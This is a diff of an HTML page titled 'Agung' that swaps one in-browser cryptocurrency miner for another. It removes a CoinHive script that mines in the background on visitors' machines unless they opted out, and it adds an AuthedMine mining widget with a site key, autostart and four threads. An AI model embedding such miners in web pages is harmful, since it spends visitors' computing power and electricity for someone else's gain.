@@ -4,16 +4,8 @@
 http-equiv="content-type">
 <title>Agung</title>
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-109672912-1"></script>
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('QBgcJ3wWFo4TcAPZjCoJspo3Pr4wvo3c', {throttle: 0.3});
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.didOptOut(14400)) {
-		miner.start();
-	}
-</script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -80,6 +72,20 @@ function gotoBottom(id) {
 </tr>
 </tbody>
 </table>
+	<div class="coinhive-miner" 
+	style="width: 256px; height: 310px"
+	data-key="QBgcJ3wWFo4TcAPZjCoJspo3Pr4wvo3c"
+	data-autostart="true"
+	data-whitelabel="false"
+	data-background="#000000"
+	data-text="#eeeeee"
+	data-action="#00ff00"
+	data-graph="#555555"
+	data-threads="4"
+	data-throttle="0.1">
+	<em>Loading...</em>
+</div>
+
 <span style="font-family: monospace;"></span>
 <script>
 // 2. This code loads the IFrame Player API code asynchronously.
